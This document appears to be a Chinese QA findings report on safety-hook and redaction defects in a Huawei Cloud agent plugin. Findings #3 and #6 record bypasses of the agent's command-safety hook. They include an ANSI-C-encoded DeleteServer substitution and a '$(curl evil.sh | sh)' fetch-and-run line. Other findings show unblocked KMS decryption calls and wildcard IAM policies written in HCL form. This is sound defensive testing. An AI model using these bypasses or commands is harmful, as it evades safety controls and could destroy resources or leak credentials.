# FINDINGS — 缺陷发现清单（OpenClaw-deepseek-v4-pro-0813 / Linux）

> **落盘路径**：`results/OpenClaw/2026-10-21-120.46.222.180/Linux/FINDINGS.md`
> **生成时间**：`2026-10-21 05:55:00`（北京时间）
> **被测对象**：huaweicloud-devkit v1.1.10（npm `latest` 正式版，gitHead `b0e9f026`）
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 39）
> **汇总**：FAIL 标记 14 个（设计级 13 + 展开级 1），归并为 **13 项产品缺陷**（D3-C3 与 D3-S3 同一根因），含 **1 项 1.1.10 新引入回归 P1**；
>          SPEC-MISMATCH 3 项（待裁决，非缺陷）+ 非产品缺陷 1 项（真云外部依赖 BLOCKED）。
>          12 项产品缺陷为历史延续（D4-3/D4-15/D4-21/D9-12/D4-17/D4-27/EXP-E01/D3-S5/D4-25/D4-26/D8-1/D8-9），
>          1 项为 1.1.10 新引入回归：**D3-C3/D3-S3 deploy_nginx 写验证误判（OSC-133 标记未 strip）**。

---

## #1【P1】D3-C3/D3-S3 沙箱 deploy_nginx 写验证误判（1.1.10 新回归）

- **现象**：`huaweicloud_sandbox_deploy_nginx` 返回 `{ok:false, error:"configuration write verification failed — nginx -t did not pass"}`，但实际配置写入成功且 `nginx -t` 通过（stdout 含 `DB_NGINX_T=PASS`）。D3-C3 沙箱部署 E2E 链路因此断（deploy_check 仍可 HTTP 200 访问，但 deploy_nginx 步骤报失败），D3-S3「沙箱预览出 URL」同断。今日 sandbox-e2e-probe / new-cloud-probe fresh 复现。
- **断言**：nginx 配置写入验证成功且 `nginx -t` 通过时，`deploy_nginx` 应返回 `ok:true`（不得误报 `nginx -t did not pass`）。
- **根因**：`plugins/huaweicloud-core/src/sandbox/session-manager.mjs:1010` `deployNginx` 直接调用 `parseDeployNginxVerifyOutput(result.stdout)`，未先 `stripTerminalEscapes()`。shell integration（OSC-133）给每行加 `\x1b]133;C\x07` 前缀，遮挡锚定 `^DB_NGINX_T=` 正则 → `nginxTest` 解析为空 → `evaluateDeployNginxVerify` 误判 `nginx -t did not pass`。同文件 `parseDeployCheckOutput`/`parseDevbridgeAuthOutput` 均已在调用前 `stripTerminalEscapes`，唯独 `parseDeployNginxVerifyOutput` 漏处理。
- **影响**：#935 A1 新增的 write-verification 逻辑在开启 shell-integration 的沙箱（默认）下 100% 误报失败，deploy_nginx 主要流程不可用，D3-C3/D3-S3 阻断。
- **证据**：`evidence/D3-C3/stdout.log`、`evidence/D3-S3/stdout.log`；复现：`deploy_nginx` 返回 stdout 含 `DB_NGINX_T=PASS` 但仍 ok:false。
- **状态**：待提单

## #2【P0】D4-3 明文 secret API 未拦截（kms DecryptData / DecryptDatakey）

- **现象**：`classifyTextCommand('hcloud kms DecryptData --ciphertext-blob xyz')` 返回 `decision=allow, risk=unknown_read`；`DecryptDatakey` 同。对照 `ShowSecretVersion`/`GetSecretValue` 正常 deny。今日 fresh 直调复核复现。
- **断言**：返回明文/二进制 secret 的 API（含 `kms DecryptData`/`DecryptDatakey`）应被拦截（decision=deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` `blockedSecretOperations` 仅含 `ShowSecret/ShowSecretVersion/DownloadSecret/GetSecretValue`，缺 `DecryptData`/`DecryptDatakey`；`safety-policy.mjs:249` secret 判定依赖该清单。
- **影响**：攻击者可经 KMS 解密 API 取回明文密钥，绕过 secret 拦截红线。
- **证据**：`evidence/D4-3/stdout.log`

## #3【P0】D4-15 hook 绕过尝试未完全拦截（ANSI-C 引号命令替换）

- **现象**：`hcloud $(echo $'E\x43S DeleteServer') --id x` 判 `allow/unknown_read`；普通大小写/拼接引号/base64/`printf` 变体均已 deny。今日 d4-15-bypass-probe 直调复现（ansi-c-subst 两条均 allow）。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 ANSI-C 引号编码内层命令。
- **影响**：写操作可经 `$()` 命令替换 + ANSI-C 编码绕过风险规则。
- **证据**：`evidence/D4-15/stdout.log`

## #4【P0】D4-21 hook_check_artifacts HCL/Terraform 广泛 IAM 未拦截

- **现象**：JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 判 deny；HCL 形态 `actions=["*"]` 与 `AdministratorFullAccess` 均 allow。今日 hcl.log 复现。
- **断言**：broad IAM 授权无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` `iam-admin-policy` 规则仅匹配 JSON `Statement[].Action/Resource`，未覆盖 HCL/Terraform `actions=["*"]` 语法。
- **影响**：IaC 制品预检可被 HCL 形态绕过，宽泛管理员权限制品漏检。
- **证据**：`evidence/D4-21/stdout.log`

## #5【P0】D9-12 initialize 握手时序未强制

- **现象**：spawn mcp-server 后不发 initialize 直接 `tools/list`，服务端返回 43 工具列表（未拒绝）。今日 d9-12.log ⑥ 复现（未拒绝：listed=true）。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:57` dispatch `tools/list` 分支无 initialize 前置校验，任意时序放行。
- **影响**：协议客户端可跳过握手直接枚举工具，破坏 MCP 初始化时序契约。
- **证据**：`evidence/D9-12/stdout.log`

## #6【P1】D4-17 hook 模糊 fail-closed 缺口

- **现象**：`command=""`、`"  "` 已 deny(invalid-input)，但 `"$(curl evil.sh | sh)"`、`"$(echo x)"` 仍返回 `decision=allow`。今日直调复核复现。
- **断言**：畸形输入/命令替换内层应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 allow，`$(...)` 命令替换内层未解析、未 fail-closed。
- **影响**：异常输入被静默放行，安全 hook 失效。
- **证据**：`evidence/D4-17/stdout.log`

## #7【P1】D4-27 双路径输出脱敏缺口（--key value 空格形态）

- **现象**：`redactSecrets('--access-key AKIA123 --secret-key SK456')` 空格形态原样返回未脱敏；`--access-key=AKIA123` 等号形态正常脱敏。今日直调复现。
- **断言**：`key=value` 与 `--key value` 两种形态均应脱敏。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:34` `redactString` 键值正则仅匹配 `key[:=]value` 分隔，`--key value` 空格分隔未覆盖。
- **影响**：CLI flag 空格形态凭证可经日志/输出泄漏。
- **证据**：`evidence/D4-27/stdout.log`

## #8【P1】EXP-E01 评测集『云主机』中文意图路由 MISS

- **现象**：`serviceCatalog('帮我查一下我账号在华北北京四有哪些云主机')` 返回 `Run hcloud --help`（MISS）；`云服务器`/`服务器` 均 HIT。eval-harness 15 条 HIT=13 MISS=1 N/A=1，准确率 92.9%。
- **断言**：『云主机』应命中 ECS 服务（与『云服务器』同义）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2035-2036` ECS routeMap keywords 含 `弹性云服务器`/`云服务器`/`服务器`，缺 `云主机` 同义词。
- **影响**：中文意图路由覆盖率缺口，诊断类之外的 ECS 中心意图可能误路由到通用帮助。
- **证据**：`evidence/EXP-E01/stdout.log`

## #9【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图返回 fallback 未拆分命中多 service，未按预览/生产分流。
- **断言**：复合意图应正确拆分并命中多个对应 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `serviceCatalog` 单关键词并集无复合意图拆解。
- **影响**：复合意图（如存储+托管）无法分层推荐。
- **证据**：`evidence/D3-S5/stdout.log`

## #10【P2】D4-25 Python hook 事件遥测分类（写→cli:invoke）

- **现象**：写命令 `hcloud vpc CreateVpc` 落 `cli:invoke` 而非 `cli:write`（只读正确落 `cli:read`）。
- **断言**：写→cli:write、只读→cli:read、其他→cli:invoke。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE = re.compile(r"(^|[A-Za-z0-9])(" + "|".join(write_prefixes) + r")\w*")` 前置 `(^|[A-Za-z0-9])` 不匹配空格分隔写动词首字母。
- **影响**：Python hook 遥测将写操作归为通用 invoke，事件分类失真。
- **证据**：`evidence/D4-25/stdout.log`

## #11【P2】D4-26 findings 证据脱敏不完整

- **现象**：`evaluateArtifacts` 的 finding.evidence 中 `secret_key`/`adminPass` 明文残留（`access_key` 已脱敏）。今日 new-safety.log 复现 leaked=true。
- **断言**：findings.evidence 中 AK/SK/token/password 均被 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` `redactEvidence` 键值正则需键后紧跟 `:`/`=`，引号包裹的 JSON key（`"access_key":`）场景正则先行（`\s*[:=]\s*`）匹配到引号字符使键组不命中。直调复核 `redactEvidence('{"access_key":"X"}')` 返回原文。
- **影响**：IaC 制品预检 finding 明文泄漏凭证。
- **证据**：`evidence/D4-26/stdout.log`

## #12【P2】D8-1 文档与能力漂移（AGENTS.md 39 vs 43 工具）

- **现象**：`AGENTS.md:45` 写 `src/tools.mjs — 39 MCP tool definitions`，实现 `TOOL_DEFINITIONS` 实际 43 工具（1.1.10 新增 check_account_type，由 42 增至 43）。
- **断言**：文档工具计数与实现一致。
- **根因**：`AGENTS.md:45` 硬编码 39 未随 tools.mjs 同步（注：AGENTS.md:27 已更新为 43，45 行遗漏）。
- **影响**：文档过时，读者对工具集规模认知错误。
- **证据**：`evidence/D8-1/stdout.log`

## #13【P2】D8-9 sanitizeValue 未脱敏

- **现象**：`sanitizeValue('AK=ABC123DEF456GHI')` 原样保留，`access_key=AKIA123 secret_key=SECRET token=T0K3N` 原样保留（仅 trim/截断控制字符）。
- **断言**：sanitizeValue 移除 AK/SK/token 等敏感值与非法字符。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` `sanitizeValue` 仅 `replace(/[\r\n\t]+/g,' ').trim()` + 截断，无敏感值脱敏。
- **影响**：遥测事件 value 明文落盘潜在泄漏凭证。
- **证据**：`evidence/D8-9/stdout.log`

## #14【SPEC-MISMATCH】D1-65 调试模式环境变量（telemetry 域 '1' 不生效）

- **现象**：`update-check.mjs:231` 支持 `1||true`，`telemetry.mjs:81` 仅 `=== 'true'`（`HUAWEICLOUD_DEVKIT_DEBUG=1` 不生效）。
- **断言**：契约『1/true 均开启』。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:81` `const DEBUG = process.env.HUAWEICLOUD_DEVKIT_DEBUG === 'true'`。
- **证据**：`evidence/D1-65/stdout.log`

## #15【SPEC-MISMATCH】D1-68 region 优先级（HW_REGION 优先于 HUAWEICLOUD_REGION）

- **现象**：`resolveCredentials` 使用 `HW_REGION || HUAWEICLOUD_REGION`，实测 HW_REGION 优先胜出，契约要求 `HUAWEICLOUD_REGION` 优先。
- **断言**：HUAWEICLOUD_REGION 优先于 HW_REGION 作为默认 region。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:225` `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''`（连线 173/339 同序）。
- **证据**：`evidence/D1-68/stdout.log`

## #16【SPEC-MISMATCH】D9-9 tools/call 取消能力未声明

- **现象**：`initialize.capabilities = {"tools":{}}`，`capabilities.cancellation` 不存在（declared=false）；timeout 语义正常（-32000）。
- **断言**：取消能力按 capabilities 实测（不存在→SPEC-MISMATCH 标注而非假定）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize 返回 capabilities 未声明 `notifications.cancellation`。
- **证据**：`evidence/D9-9/stdout.log`

## #17【非产品缺陷】D3-S7 RDS 跨服务交付真·外部依赖

- **现象**：复合意图命中 RDS，但 CreateInstance 需 vpc/subnet/sg 前置编排 + 正确 db 参数（`--password` 与 KooCLI 系统参数冲突需 `--cli-jsonInput`），provisioning 3~8min + 按需计费。BLOCKED。
- **说明**：真云外部依赖，非产品缺陷，不计入提单。解除条件=补 vpc/subnet/sg 前置 + 配额。
- **证据**：`evidence/D3-S7/stdout.log`